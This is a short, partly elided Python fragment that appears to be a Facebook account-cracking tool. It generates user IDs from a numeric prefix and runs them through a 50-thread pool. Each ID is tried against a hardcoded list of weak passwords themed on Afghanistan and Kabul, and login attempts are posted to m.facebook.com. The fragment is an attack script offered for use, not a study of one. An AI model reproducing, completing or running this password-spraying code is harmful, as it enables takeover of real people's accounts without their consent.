...
def afg():
    ...
    with ThreadPool(max_workers=50) as basir:
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','100200','200300','500500','700800','123456','900900','600700','300400','400500','Afghanistan123','Afghanistan','Afghan1234','Afghan12345','kabul1234','kabul123','kabul12345','khankhan','khan1234','khan12345','khan123']
...
def rdm(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://m.facebook.com/', cookies=cookies, headers=headers)
